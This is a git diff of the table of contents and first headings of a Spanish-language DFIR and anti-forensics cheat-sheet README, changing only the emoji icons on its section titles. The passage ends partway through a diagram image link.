@@ -8,130 +8,130 @@ Análisis forense de artefactos comunes y no tan comunes, técnicas anti-forense
 
 <h1>Índice</h1>
 
-- [🔍 Análisis Forense, Artefactos y Respuesta Incidentes](#-análisis-forense-artefactos-y-respuesta-incidentes)
-  - [✅ Gestión de Respuesta a Incidentes y Análisis Forense Digital (DFIR)](#-gestión-de-respuesta-a-incidentes-y-análisis-forense-digital-dfir)
-    - [▶️ Diagrama de preguntas de Respuesta a Incidentes - Análisis inicial, ¿qué ha pasado?](#️-diagrama-de-preguntas-de-respuesta-a-incidentes---análisis-inicial-qué-ha-pasado)
-    - [▶️ Ciclo de vida - Respuesta a Incidentes](#️-ciclo-de-vida---respuesta-a-incidentes)
-    - [▶️ Preguntas - Respuesta a Incidentes](#️-preguntas---respuesta-a-incidentes)
-    - [▶️ Preguntas - Análisis Forense Digital](#️-preguntas---análisis-forense-digital)
-    - [▶️ Metodología - Análisis Forense Digital](#️-metodología---análisis-forense-digital)
-  - [✅ Windows](#-windows)
-    - [▶️ Logs de eventos de Windows](#️-logs-de-eventos-de-windows)
-    - [▶️ Logs de registros sobre instalaciones de Windows](#️-logs-de-registros-sobre-instalaciones-de-windows)
-    - [▶️ Lista de Events ID de Windows y Sysmon relevantes en investigaciones DFIR](#️-lista-de-events-id-de-windows-y-sysmon-relevantes-en-investigaciones-dfir)
-    - [▶️ Artefactos de Tareas programadas en Windows](#️-artefactos-de-tareas-programadas-en-windows)
-    - [▶️ Scripts para detectar actividades sospechosas en Windows](#️-scripts-para-detectar-actividades-sospechosas-en-windows)
-    - [▶️ Obtener software instalado y sus versiones (x86 y x64)](#️-obtener-software-instalado-y-sus-versiones-x86-y-x64)
-    - [▶️ Análisis y artefactos de ShellBags](#️-análisis-y-artefactos-de-shellbags)
-    - [▶️ Detectar peristencia de ejecutables en el registro de Windows (técnicas basadas en la matriz de *MITRE ATT\&CK*)](#️-detectar-peristencia-de-ejecutables-en-el-registro-de-windows-técnicas-basadas-en-la-matriz-de-mitre-attck)
-    - [▶️ Artefactos de conexiones de clientes VPN](#️-artefactos-de-conexiones-de-clientes-vpn)
-    - [▶️ Persistencia en servicios](#️-persistencia-en-servicios)
-    - [▶️ ¿Han eliminado el registro de eventos de Windows?](#️-han-eliminado-el-registro-de-eventos-de-windows)
-    - [▶️ Volatility: clipboard](#️-volatility-clipboard)
-    - [▶️ Artefactos Adobe Acrobat: Caché de historial de PDFs abiertos recientemente](#️-artefactos-adobe-acrobat-caché-de-historial-de-pdfs-abiertos-recientemente)
-    - [▶️ Ventana "Ejecutar" y barra direcciones de Explorer.exe: Caché de historial de ficheros y paths visitados recientemente](#️-ventana-ejecutar-y-barra-direcciones-de-explorerexe-caché-de-historial-de-ficheros-y-paths-visitados-recientemente)
-    - [▶️ Thumbcache Viewer](#️-thumbcache-viewer)
-    - [▶️ Historial de pestañas sin cerrar de Notepad.exe (Win11)](#️-historial-de-pestañas-sin-cerrar-de-notepadexe-win11)
-    - [▶️ Artefáctos forenses en AnyDesk, Team Viewer y LogMeIn](#️-artefáctos-forenses-en-anydesk-team-viewer-y-logmein)
-    - [▶️ Sesiones de conexión remota almacenadas con PuTTY, MobaXterm, WinSCP (SSH, RDP, FTP, SFTP, SCP u otras)](#️-sesiones-de-conexión-remota-almacenadas-con-putty-mobaxterm-winscp-ssh-rdp-ftp-sftp-scp-u-otras)
-    - [▶️ Conocer la URL de descarga de un archivo (ADS Zone.Identifier)](#️-conocer-la-url-de-descarga-de-un-archivo-ads-zoneidentifier)
-    - [▶️ Modificar y detectar Timestamps modificados en ficheros analizando sus metadatos (intento anti-forense)](#️-modificar-y-detectar-timestamps-modificados-en-ficheros-analizando-sus-metadatos-intento-anti-forense)
-    - [▶️ PSReadLine: Historial de comandos ejecutados en una consola PowerShell](#️-psreadline-historial-de-comandos-ejecutados-en-una-consola-powershell)
-    - [▶️ Caché almacenada de conexiones establecidas a otros hosts vía RDP](#️-caché-almacenada-de-conexiones-establecidas-a-otros-hosts-vía-rdp)
-    - [▶️ Artefactos forense - MS Word](#️-artefactos-forense---ms-word)
-    - [▶️ Análisis de malware en ficheros XLSX (MS Excel)](#️-análisis-de-malware-en-ficheros-xlsx-ms-excel)
-    - [▶️ Análisis de malware en ficheros MS Office (oletools)](#️-análisis-de-malware-en-ficheros-ms-office-oletools)
-    - [▶️ Herramientas de análisis en ficheros MS Office y otros (detectar malware o phising)](#️-herramientas-de-análisis-en-ficheros-ms-office-y-otros-detectar-malware-o-phising)
-    - [▶️ Herramientes de análisis PDF (detectar malware o phising)](#️-herramientes-de-análisis-pdf-detectar-malware-o-phising)
-    - [▶️ Identificar Shellcodes en ficheros y otros comandos de análisis](#️-identificar-shellcodes-en-ficheros-y-otros-comandos-de-análisis)
-    - [▶️ Detectar URL maliciosas en el documento](#️-detectar-url-maliciosas-en-el-documento)
-    - [▶️ Asignación de IPs en equipos](#️-asignación-de-ips-en-equipos)
-    - [▶️ Windows Firewall (wf.msc): Reglas residuales de software desintalado](#️-windows-firewall-wfmsc-reglas-residuales-de-software-desintalado)
-    - [▶️ Persistencia: suplantación de procesos del sistema](#️-persistencia-suplantación-de-procesos-del-sistema)
-    - [▶️ Herramientas para consultar y auditar: GPOs, control de accesos, usuarios, grupos y otros funciones de Active Directory y LDAP](#️-herramientas-para-consultar-y-auditar-gpos-control-de-accesos-usuarios-grupos-y-otros-funciones-de-active-directory-y-ldap)
-    - [▶️ Análisis de phishing mails (extensión .eml)](#️-análisis-de-phishing-mails-extensión-eml)
-    - [▶️ MUICache: artefactos sobre aplicaciones](#️-muicache-artefactos-sobre-aplicaciones)
-    - [▶️ FeatureUsage: reconstruir las actividades de los usuarios](#️-featureusage-reconstruir-las-actividades-de-los-usuarios)
-    - [▶️ MRU (Most Recently Used): Artefactos de Office local y Office 365](#️-mru-most-recently-used-artefactos-de-office-local-y-office-365)
-    - [▶️ Ver el úlimo fichero descomprimido 7-Zip](#️-ver-el-úlimo-fichero-descomprimido-7-zip)
-    - [▶️ LOLBins comunes y sus artefactos](#️-lolbins-comunes-y-sus-artefactos)
-  - [✅ Linux](#-linux)
-    - [▶️ Logs del sistema de Linux](#️-logs-del-sistema-de-linux)
-    - [▶️ Logs de aplicaciones de Linux](#️-logs-de-aplicaciones-de-linux)
-    - [▶️ Logs journalctl (systemd)](#️-logs-journalctl-systemd)
-    - [▶️ Copiar un binario malicioso ya eliminado a través de su proceso todavía en ejecución](#️-copiar-un-binario-malicioso-ya-eliminado-a-través-de-su-proceso-todavía-en-ejecución)
-    - [▶️ Identificar y obtener archivos con PID de procesos maliciosos (conexiones SSH Linux)](#️-identificar-y-obtener-archivos-con-pid-de-procesos-maliciosos-conexiones-ssh-linux)
-    - [▶️ Recopilar información en un primer análisis de respuesta a incidentes (sistema Linux)](#️-recopilar-información-en-un-primer-análisis-de-respuesta-a-incidentes-sistema-linux)
-    - [▶️ Historial de comandos de la Shell de Linux (.bash\_history \& .zsh\_history)](#️-historial-de-comandos-de-la-shell-de-linux-bash_history--zsh_history)
-    - [▶️ Voldado de todos los directorios y ficheros de Linux](#️-voldado-de-todos-los-directorios-y-ficheros-de-linux)
-    - [▶️ Volcado de Memoria RAM en Linux con LiME (Linux Memory Extractor)](#️-volcado-de-memoria-ram-en-linux-con-lime-linux-memory-extractor)
-    - [▶️ Comprobar si un usuario ejecutó el comando "sudo"](#️-comprobar-si-un-usuario-ejecutó-el-comando-sudo)
-    - [▶️ Detectar malware Linux fileless (memfd)](#️-detectar-malware-linux-fileless-memfd)
-  - [✅ Redes](#-redes)
-    - [▶️ Filtros Wireshark para analistas](#️-filtros-wireshark-para-analistas)
-  - [✅ Contenedores](#-contenedores)
-    - [▶️ Análisis Forense en contenedores Docker](#️-análisis-forense-en-contenedores-docker)
-  - [✅ Android \& iOS](#-android--ios)
-    - [▶️ Forense Android: Evidencias de imágenes eliminadas y enviadas por WhatsApp](#️-forense-android-evidencias-de-imágenes-eliminadas-y-enviadas-por-whatsapp)
-  - [✅ Varios](#-varios)
-    - [▶️ Artefactos en dispositivos USB en Windows, Linux y MacOS](#️-artefactos-en-dispositivos-usb-en-windows-linux-y-macos)
-    - [▶️ Recopilación de artefactos de paths en Windows, Linux y MacOS](#️-recopilación-de-artefactos-de-paths-en-windows-linux-y-macos)
-  - [✅ Herramientas](#-herramientas)
-    - [▶️ Autopsy: Herramienta avanzada de análisis forense digital](#️-autopsy-herramienta-avanzada-de-análisis-forense-digital)
-    - [▶️ X-Ways Forensics: Herramienta avanzada de análisis forense digital](#️-x-ways-forensics-herramienta-avanzada-de-análisis-forense-digital)
-    - [▶️ Volatility: Análisis de volcados de memoria](#️-volatility-análisis-de-volcados-de-memoria)
-    - [▶️ WinTriage (Securizame): Análisis y extracción de artefactos forenses Windows](#️-wintriage-securizame-análisis-y-extracción-de-artefactos-forenses-windows)
-    - [▶️ Velociraptor: Recolección, monitorización y hunting para análisis forense digital y respuesta a incidentes en Windows](#️-velociraptor-recolección-monitorización-y-hunting-para-análisis-forense-digital-y-respuesta-a-incidentes-en-windows)
-    - [▶️ LogonTracer: Trazabilidad de inicios de sesión en Active Directory](#️-logontracer-trazabilidad-de-inicios-de-sesión-en-active-directory)
-    - [▶️ AuthLogParser: Análisis auth.log, resumen de registros relacionados con autenticación](#️-authlogparser-análisis-authlog-resumen-de-registros-relacionados-con-autenticación)
-    - [▶️ Skadi: Análisis de artefactos e imágenes forenses](#️-skadi-análisis-de-artefactos-e-imágenes-forenses)
-    - [▶️ GRR - Google Rapid Response](#️-grr---google-rapid-response)
-    - [▶️ Arkime - Almacenar e indexar el tráfico de red en formato PCAP](#️-arkime---almacenar-e-indexar-el-tráfico-de-red-en-formato-pcap)
-    - [▶️ Live Forensicator - Recolección automatizada de información y artefactos en Windows, Linux y MacOS](#️-live-forensicator---recolección-automatizada-de-información-y-artefactos-en-windows-linux-y-macos)
-    - [▶️ FTK Forensic Toolkit (Exterro)](#️-ftk-forensic-toolkit-exterro)
-    - [▶️ EnCase Forensic (ondata)](#️-encase-forensic-ondata)
-    - [▶️ SANS DFIR - Posters \& Cheat Sheets](#️-sans-dfir---posters--cheat-sheets)
+- [📓 Análisis Forense, Artefactos y Respuesta Incidentes](#-análisis-forense-artefactos-y-respuesta-incidentes)
+  - [📁 Gestión de Respuesta a Incidentes y Análisis Forense Digital (DFIR)](#-gestión-de-respuesta-a-incidentes-y-análisis-forense-digital-dfir)
+    - [📜 Diagrama de preguntas de Respuesta a Incidentes - Análisis inicial, ¿qué ha pasado?](#-diagrama-de-preguntas-de-respuesta-a-incidentes---análisis-inicial-qué-ha-pasado)
+    - [📜 Ciclo de vida - Respuesta a Incidentes](#-ciclo-de-vida---respuesta-a-incidentes)
+    - [📜 Preguntas - Respuesta a Incidentes](#-preguntas---respuesta-a-incidentes)
+    - [📜 Preguntas - Análisis Forense Digital](#-preguntas---análisis-forense-digital)
+    - [📜 Metodología - Análisis Forense Digital](#-metodología---análisis-forense-digital)
+  - [📁 Windows](#-windows)
+    - [📜 Logs de eventos de Windows](#-logs-de-eventos-de-windows)
+    - [📜 Logs de registros sobre instalaciones de Windows](#-logs-de-registros-sobre-instalaciones-de-windows)
+    - [📜 Lista de Events ID de Windows y Sysmon relevantes en investigaciones DFIR](#-lista-de-events-id-de-windows-y-sysmon-relevantes-en-investigaciones-dfir)
+    - [📜 Artefactos de Tareas programadas en Windows](#-artefactos-de-tareas-programadas-en-windows)
+    - [📜 Scripts para detectar actividades sospechosas en Windows](#-scripts-para-detectar-actividades-sospechosas-en-windows)
+    - [📜 Obtener software instalado y sus versiones (x86 y x64)](#-obtener-software-instalado-y-sus-versiones-x86-y-x64)
+    - [📜 Análisis y artefactos de ShellBags](#-análisis-y-artefactos-de-shellbags)
+    - [📜 Detectar peristencia de ejecutables en el registro de Windows (técnicas basadas en la matriz de *MITRE ATT\&CK*)](#-detectar-peristencia-de-ejecutables-en-el-registro-de-windows-técnicas-basadas-en-la-matriz-de-mitre-attck)
+    - [📜 Artefactos de conexiones de clientes VPN](#-artefactos-de-conexiones-de-clientes-vpn)
+    - [📜 Persistencia en servicios](#-persistencia-en-servicios)
+    - [📜 ¿Han eliminado el registro de eventos de Windows?](#-han-eliminado-el-registro-de-eventos-de-windows)
+    - [📜 Volatility: clipboard](#-volatility-clipboard)
+    - [📜 Artefactos Adobe Acrobat: Caché de historial de PDFs abiertos recientemente](#-artefactos-adobe-acrobat-caché-de-historial-de-pdfs-abiertos-recientemente)
+    - [📜 Ventana "Ejecutar" y barra direcciones de Explorer.exe: Caché de historial de ficheros y paths visitados recientemente](#-ventana-ejecutar-y-barra-direcciones-de-explorerexe-caché-de-historial-de-ficheros-y-paths-visitados-recientemente)
+    - [📜 Thumbcache Viewer](#-thumbcache-viewer)
+    - [📜 Historial de pestañas sin cerrar de Notepad.exe (Win11)](#-historial-de-pestañas-sin-cerrar-de-notepadexe-win11)
+    - [📜 Artefáctos forenses en AnyDesk, Team Viewer y LogMeIn](#-artefáctos-forenses-en-anydesk-team-viewer-y-logmein)
+    - [📜 Sesiones de conexión remota almacenadas con PuTTY, MobaXterm, WinSCP (SSH, RDP, FTP, SFTP, SCP u otras)](#-sesiones-de-conexión-remota-almacenadas-con-putty-mobaxterm-winscp-ssh-rdp-ftp-sftp-scp-u-otras)
+    - [📜 Conocer la URL de descarga de un archivo (ADS Zone.Identifier)](#-conocer-la-url-de-descarga-de-un-archivo-ads-zoneidentifier)
+    - [📜 Modificar y detectar Timestamps modificados en ficheros analizando sus metadatos (intento anti-forense)](#-modificar-y-detectar-timestamps-modificados-en-ficheros-analizando-sus-metadatos-intento-anti-forense)
+    - [📜 PSReadLine: Historial de comandos ejecutados en una consola PowerShell](#-psreadline-historial-de-comandos-ejecutados-en-una-consola-powershell)
+    - [📜 Caché almacenada de conexiones establecidas a otros hosts vía RDP](#-caché-almacenada-de-conexiones-establecidas-a-otros-hosts-vía-rdp)
+    - [📜 Artefactos forense - MS Word](#-artefactos-forense---ms-word)
+    - [📜 Análisis de malware en ficheros XLSX (MS Excel)](#-análisis-de-malware-en-ficheros-xlsx-ms-excel)
+    - [📜 Análisis de malware en ficheros MS Office (oletools)](#-análisis-de-malware-en-ficheros-ms-office-oletools)
+    - [📜 Herramientas de análisis en ficheros MS Office y otros (detectar malware o phising)](#-herramientas-de-análisis-en-ficheros-ms-office-y-otros-detectar-malware-o-phising)
+    - [📜 Herramientes de análisis PDF (detectar malware o phising)](#-herramientes-de-análisis-pdf-detectar-malware-o-phising)
+    - [📜 Identificar Shellcodes en ficheros y otros comandos de análisis](#-identificar-shellcodes-en-ficheros-y-otros-comandos-de-análisis)
+    - [📜 Detectar URL maliciosas en el documento](#-detectar-url-maliciosas-en-el-documento)
+    - [📜 Asignación de IPs en equipos](#-asignación-de-ips-en-equipos)
+    - [📜 Windows Firewall (wf.msc): Reglas residuales de software desintalado](#-windows-firewall-wfmsc-reglas-residuales-de-software-desintalado)
+    - [📜 Persistencia: suplantación de procesos del sistema](#-persistencia-suplantación-de-procesos-del-sistema)
+    - [📜 Herramientas para consultar y auditar: GPOs, control de accesos, usuarios, grupos y otros funciones de Active Directory y LDAP](#-herramientas-para-consultar-y-auditar-gpos-control-de-accesos-usuarios-grupos-y-otros-funciones-de-active-directory-y-ldap)
+    - [📜 Análisis de phishing mails (extensión .eml)](#-análisis-de-phishing-mails-extensión-eml)
+    - [📜 MUICache: artefactos sobre aplicaciones](#-muicache-artefactos-sobre-aplicaciones)
+    - [📜 FeatureUsage: reconstruir las actividades de los usuarios](#-featureusage-reconstruir-las-actividades-de-los-usuarios)
+    - [📜 MRU (Most Recently Used): Artefactos de Office local y Office 365](#-mru-most-recently-used-artefactos-de-office-local-y-office-365)
+    - [📜 Ver el úlimo fichero descomprimido 7-Zip](#-ver-el-úlimo-fichero-descomprimido-7-zip)
+    - [📜 LOLBins comunes y sus artefactos](#-lolbins-comunes-y-sus-artefactos)
+  - [📁 Linux](#-linux)
+    - [📜 Logs del sistema de Linux](#-logs-del-sistema-de-linux)
+    - [📜 Logs de aplicaciones de Linux](#-logs-de-aplicaciones-de-linux)
+    - [📜 Logs journalctl (systemd)](#-logs-journalctl-systemd)
+    - [📜 Copiar un binario malicioso ya eliminado a través de su proceso todavía en ejecución](#-copiar-un-binario-malicioso-ya-eliminado-a-través-de-su-proceso-todavía-en-ejecución)
+    - [📜 Identificar y obtener archivos con PID de procesos maliciosos (conexiones SSH Linux)](#-identificar-y-obtener-archivos-con-pid-de-procesos-maliciosos-conexiones-ssh-linux)
+    - [📜 Recopilar información en un primer análisis de respuesta a incidentes (sistema Linux)](#-recopilar-información-en-un-primer-análisis-de-respuesta-a-incidentes-sistema-linux)
+    - [📜 Historial de comandos de la Shell de Linux (.bash\_history \& .zsh\_history)](#-historial-de-comandos-de-la-shell-de-linux-bash_history--zsh_history)
+    - [📜 Voldado de todos los directorios y ficheros de Linux](#-voldado-de-todos-los-directorios-y-ficheros-de-linux)
+    - [📜 Volcado de Memoria RAM en Linux con LiME (Linux Memory Extractor)](#-volcado-de-memoria-ram-en-linux-con-lime-linux-memory-extractor)
+    - [📜 Comprobar si un usuario ejecutó el comando "sudo"](#-comprobar-si-un-usuario-ejecutó-el-comando-sudo)
+    - [📜 Detectar malware Linux fileless (memfd)](#-detectar-malware-linux-fileless-memfd)
+  - [📁 Redes](#-redes)
+    - [📜 Filtros Wireshark para analistas](#-filtros-wireshark-para-analistas)
+  - [📁 Contenedores](#-contenedores)
+    - [📜 Análisis Forense en contenedores Docker](#-análisis-forense-en-contenedores-docker)
+  - [📁 Android \& iOS](#-android--ios)
+    - [📜 Forense Android: Evidencias de imágenes eliminadas y enviadas por WhatsApp](#-forense-android-evidencias-de-imágenes-eliminadas-y-enviadas-por-whatsapp)
+  - [📁 Varios](#-varios)
+    - [📜 Artefactos en dispositivos USB en Windows, Linux y MacOS](#-artefactos-en-dispositivos-usb-en-windows-linux-y-macos)
+    - [📜 Recopilación de artefactos de paths en Windows, Linux y MacOS](#-recopilación-de-artefactos-de-paths-en-windows-linux-y-macos)
+  - [📁 Herramientas](#-herramientas)
+    - [📜 Autopsy: Herramienta avanzada de análisis forense digital](#-autopsy-herramienta-avanzada-de-análisis-forense-digital)
+    - [📜 X-Ways Forensics: Herramienta avanzada de análisis forense digital](#-x-ways-forensics-herramienta-avanzada-de-análisis-forense-digital)
+    - [📜 Volatility: Análisis de volcados de memoria](#-volatility-análisis-de-volcados-de-memoria)
+    - [📜 WinTriage (Securizame): Análisis y extracción de artefactos forenses Windows](#-wintriage-securizame-análisis-y-extracción-de-artefactos-forenses-windows)
+    - [📜 Velociraptor: Recolección, monitorización y hunting para análisis forense digital y respuesta a incidentes en Windows](#-velociraptor-recolección-monitorización-y-hunting-para-análisis-forense-digital-y-respuesta-a-incidentes-en-windows)
+    - [📜 LogonTracer: Trazabilidad de inicios de sesión en Active Directory](#-logontracer-trazabilidad-de-inicios-de-sesión-en-active-directory)
+    - [📜 AuthLogParser: Análisis auth.log, resumen de registros relacionados con autenticación](#-authlogparser-análisis-authlog-resumen-de-registros-relacionados-con-autenticación)
+    - [📜 Skadi: Análisis de artefactos e imágenes forenses](#-skadi-análisis-de-artefactos-e-imágenes-forenses)
+    - [📜 GRR - Google Rapid Response](#-grr---google-rapid-response)
+    - [📜 Arkime - Almacenar e indexar el tráfico de red en formato PCAP](#-arkime---almacenar-e-indexar-el-tráfico-de-red-en-formato-pcap)
+    - [📜 Live Forensicator - Recolección automatizada de información y artefactos en Windows, Linux y MacOS](#-live-forensicator---recolección-automatizada-de-información-y-artefactos-en-windows-linux-y-macos)
+    - [📜 FTK Forensic Toolkit (Exterro)](#-ftk-forensic-toolkit-exterro)
+    - [📜 EnCase Forensic (ondata)](#-encase-forensic-ondata)
+    - [📜 SANS DFIR - Posters \& Cheat Sheets](#-sans-dfir---posters--cheat-sheets)
 - [📓 Detección de técnicas de evasión en sistemas SIEM, SOC y Anti-Forense](#-detección-de-técnicas-de-evasión-en-sistemas-siem-soc-y-anti-forense)
-  - [✅ Windows](#-windows-1)
-    - [▶️ Comando Windows: "net" y "net1"](#️-comando-windows-net-y-net1)
-    - [▶️ Detectar técnicas maliciosas realizadas a través de CertUtil (LOLBin)](#️-detectar-técnicas-maliciosas-realizadas-a-través-de-certutil-lolbin)
-    - [▶️ Detectar descargas de ficheros realizadas a través de PowerShell usando "Invoke-WebRequest, Invoke-RestMethod, BitsTransfer"](#️-detectar-descargas-de-ficheros-realizadas-a-través-de-powershell-usando-invoke-webrequest-invoke-restmethod-bitstransfer)
-    - [▶️ Post-Explotación - PrivEsc con scmanager](#️-post-explotación---privesc-con-scmanager)
-    - [▶️ DLL Hijacking *cscapi.dll*](#️-dll-hijacking-cscapidll)
-    - [▶️ Otras técnicas de ejecución de CMD o PowerShell](#️-otras-técnicas-de-ejecución-de-cmd-o-powershell)
-    - [▶️ Uso de *type* para descargar o subir ficheros](#️-uso-de-type-para-descargar-o-subir-ficheros)
-    - [▶️ Bloquear conexiones USB: Rubber Ducky y Cactus WHID](#️-bloquear-conexiones-usb-rubber-ducky-y-cactus-whid)
-    - [▶️ Claves de registro de Windows donde se almacenan las contraseñas](#️-claves-de-registro-de-windows-donde-se-almacenan-las-contraseñas)
-    - [▶️ WDigest Authentication: Habilitado / Deshabilitado](#️-wdigest-authentication-habilitado--deshabilitado)
-    - [▶️ Detectar si un sistema es una máquina física o virtual y su tipo de hipervisor o CSP (Azure, AWS, GCP)](#️-detectar-si-un-sistema-es-una-máquina-física-o-virtual-y-su-tipo-de-hipervisor-o-csp-azure-aws-gcp)
-    - [▶️ Técnicas de ofuscación en la ejecución de comandos en Windows](#️-técnicas-de-ofuscación-en-la-ejecución-de-comandos-en-windows)
-    - [▶️ Detectar acciones de AutoRun al abrir una Command Prompt (cmd)](#️-detectar-acciones-de-autorun-al-abrir-una-command-prompt-cmd)
-    - [▶️ Extensiones ejecutables alternativas a .exe](#️-extensiones-ejecutables-alternativas-a-exe)
-    - [▶️ Detectar malware que se está ejecutando desde una carpeta que no permite su acceso por error de ubicación (flujo NTFS en directorios $INDEX\_ALLOCATION)](#️-detectar-malware-que-se-está-ejecutando-desde-una-carpeta-que-no-permite-su-acceso-por-error-de-ubicación-flujo-ntfs-en-directorios-index_allocation)
-    - [▶️ Deshabilitar Windows Defender para eludir la detección de AMSI en la ejecución de binarios maliciosos (renombrar MsMpEng.exe a través del registro ControlSet00X)](#️-deshabilitar-windows-defender-para-eludir-la-detección-de-amsi-en-la-ejecución-de-binarios-maliciosos-renombrar-msmpengexe-a-través-del-registro-controlset00x)
-  - [✅ Linux](#-linux-1)
-    - [▶️ *debugfs* para eludir alertas al ejecutar comandos o acceder a ficheros con auditoria](#️-debugfs-para-eludir-alertas-al-ejecutar-comandos-o-acceder-a-ficheros-con-auditoria)
-    - [▶️ Detectar la ejecución de comandos de forma oculta en history](#️-detectar-la-ejecución-de-comandos-de-forma-oculta-en-history)
-    - [▶️ Deshabilitar el uso del historial de la Shell](#️-deshabilitar-el-uso-del-historial-de-la-shell)
-    - [▶️ Eliminar el historial de comandos de la Shell (.bash\_history \& .zsh\_history)](#️-eliminar-el-historial-de-comandos-de-la-shell-bash_history--zsh_history)
-    - [▶️ Auditoría en el uso privilegiado de los siguientes comandos en Linux](#️-auditoría-en-el-uso-privilegiado-de-los-siguientes-comandos-en-linux)
-  - [✅ Redes](#-redes-1)
-    - [▶️ WAF Bypass (SSRF): usar acortamiento IP local](#️-waf-bypass-ssrf-usar-acortamiento-ip-local)
-    - [▶️ Dirección IPv6 asignada a IPv4 utilizada para ofuscación](#️-dirección-ipv6-asignada-a-ipv4-utilizada-para-ofuscación)
-  - [✅ Varios](#-varios-1)
-    - [▶️ Forensia (Anti-Forensic)](#️-forensia-anti-forensic)
+  - [📁 Windows](#-windows-1)
+    - [📜 Comando Windows: "net" y "net1"](#-comando-windows-net-y-net1)
+    - [📜 Detectar técnicas maliciosas realizadas a través de CertUtil (LOLBin)](#-detectar-técnicas-maliciosas-realizadas-a-través-de-certutil-lolbin)
+    - [📜 Detectar descargas de ficheros realizadas a través de PowerShell usando "Invoke-WebRequest, Invoke-RestMethod, BitsTransfer"](#-detectar-descargas-de-ficheros-realizadas-a-través-de-powershell-usando-invoke-webrequest-invoke-restmethod-bitstransfer)
+    - [📜 Post-Explotación - PrivEsc con scmanager](#-post-explotación---privesc-con-scmanager)
+    - [📜 DLL Hijacking *cscapi.dll*](#-dll-hijacking-cscapidll)
+    - [📜 Otras técnicas de ejecución de CMD o PowerShell](#-otras-técnicas-de-ejecución-de-cmd-o-powershell)
+    - [📜 Uso de *type* para descargar o subir ficheros](#-uso-de-type-para-descargar-o-subir-ficheros)
+    - [📜 Bloquear conexiones USB: Rubber Ducky y Cactus WHID](#-bloquear-conexiones-usb-rubber-ducky-y-cactus-whid)
+    - [📜 Claves de registro de Windows donde se almacenan las contraseñas](#-claves-de-registro-de-windows-donde-se-almacenan-las-contraseñas)
+    - [📜 WDigest Authentication: Habilitado / Deshabilitado](#-wdigest-authentication-habilitado--deshabilitado)
+    - [📜 Detectar si un sistema es una máquina física o virtual y su tipo de hipervisor o CSP (Azure, AWS, GCP)](#-detectar-si-un-sistema-es-una-máquina-física-o-virtual-y-su-tipo-de-hipervisor-o-csp-azure-aws-gcp)
+    - [📜 Técnicas de ofuscación en la ejecución de comandos en Windows](#-técnicas-de-ofuscación-en-la-ejecución-de-comandos-en-windows)
+    - [📜 Detectar acciones de AutoRun al abrir una Command Prompt (cmd)](#-detectar-acciones-de-autorun-al-abrir-una-command-prompt-cmd)
+    - [📜 Extensiones ejecutables alternativas a .exe](#-extensiones-ejecutables-alternativas-a-exe)
+    - [📜 Detectar malware que se está ejecutando desde una carpeta que no permite su acceso por error de ubicación (flujo NTFS en directorios $INDEX\_ALLOCATION)](#-detectar-malware-que-se-está-ejecutando-desde-una-carpeta-que-no-permite-su-acceso-por-error-de-ubicación-flujo-ntfs-en-directorios-index_allocation)
+    - [📜 Deshabilitar Windows Defender para eludir la detección de AMSI en la ejecución de binarios maliciosos (renombrar MsMpEng.exe a través del registro ControlSet00X)](#-deshabilitar-windows-defender-para-eludir-la-detección-de-amsi-en-la-ejecución-de-binarios-maliciosos-renombrar-msmpengexe-a-través-del-registro-controlset00x)
+  - [📁 Linux](#-linux-1)
+    - [📜 *debugfs* para eludir alertas al ejecutar comandos o acceder a ficheros con auditoria](#-debugfs-para-eludir-alertas-al-ejecutar-comandos-o-acceder-a-ficheros-con-auditoria)
+    - [📜 Detectar la ejecución de comandos de forma oculta en history](#-detectar-la-ejecución-de-comandos-de-forma-oculta-en-history)
+    - [📜 Deshabilitar el uso del historial de la Shell](#-deshabilitar-el-uso-del-historial-de-la-shell)
+    - [📜 Eliminar el historial de comandos de la Shell (.bash\_history \& .zsh\_history)](#-eliminar-el-historial-de-comandos-de-la-shell-bash_history--zsh_history)
+    - [📜 Auditoría en el uso privilegiado de los siguientes comandos en Linux](#-auditoría-en-el-uso-privilegiado-de-los-siguientes-comandos-en-linux)
+  - [📁 Redes](#-redes-1)
+    - [📜 WAF Bypass (SSRF): usar acortamiento IP local](#-waf-bypass-ssrf-usar-acortamiento-ip-local)
+    - [📜 Dirección IPv6 asignada a IPv4 utilizada para ofuscación](#-dirección-ipv6-asignada-a-ipv4-utilizada-para-ofuscación)
+  - [📁 Varios](#-varios-1)
+    - [📜 Forensia (Anti-Forensic)](#-forensia-anti-forensic)
 
 ---
 
-# 🔍 Análisis Forense, Artefactos y Respuesta Incidentes
+# 📓 Análisis Forense, Artefactos y Respuesta Incidentes
 
-## ✅ Gestión de Respuesta a Incidentes y Análisis Forense Digital (DFIR)
+## 📁 Gestión de Respuesta a Incidentes y Análisis Forense Digital (DFIR)
 
-### ▶️ Diagrama de preguntas de Respuesta a Incidentes - Análisis inicial, ¿qué ha pasado?
+### 📜 Diagrama de preguntas de Respuesta a Incidentes - Análisis inicial, ¿qué ha pasado?
 
 [![](https://mermaid.ink/img/pako:eNp9VU1vEzEQ_SvWnrbSFpSGUw9U2aQSSAUVWi4ol4k9SQ1ee-uPQqj6Y3rsgVN_ABL7xxjvRxoSt3tK1jPjN2_em73NuBGYHWdLZX7wK7CenX2ea0bPJP_751NoHtgVsBocCHNy0J305-zw8C0rRxQ2YddBNg-awRK5hyGuHPUhk_yLC2Clcex1nz08XEnUHhMHRsHCWLrWotsUHC4tB3ACubSK8tc7-W2N5rEyT2jKPnmanzpvweNKAhVIJZoqaMmBy-ZR73RzlF80j8oksiQ1YjVUsaEEVdNI1SW1i8xijZYHJ40m6P9XUriC2JDZI0QTaO5DPB2amo760pN8arQLyoONkQl0ztTGeuzqb9IHaGV-3jxYIUXLiABvXKIGoXZGRwA79x9Ra6eOBU3ZSvoUO9cBWW0EVMnKAnXQXILddHbUV57k74w2tmDn1tQSBYhnqFfYklPEP5a4pdEViVD86Y3tT9HzV7v3RWldohYWI9KIer_GitQsiGm8kQScYCfJAgtkHo6WKXih5aeOO4FOx9F6F7BoAQgCmtSowxcqlPlEN_dKOunYkhykKfowKXTtSVO9aIJOzzwOtK9CN21rejbKzwikQ3sjefT3rg0JgMeK-OlWgzCDcmadcmY0X3Jjc6_ZAr6ldKMDkltNp38zKJfyuvxxuUUWDIso1YaQlsE6kMLXz9vjZK_-tNNDW98iD-SAZ6cdMVIoCUMlRcqjXLYuGU-7S95MaKn8Lja97ufSEqzJ4LBQcezs_WVaEVFujINdmb0ryvyjKTYDb9lSL6wJsgktM7M7rbKdt-_5SLor7kAlf23PutflbNyuqQ2A9KIi7mprbhBp9R9kRVahrUAK-kjdxuB55q-wwnl2TD_JhN_n2VzfURwEby7WmmfHZH8sslDTGsOZhJWFanhJKiD7f-g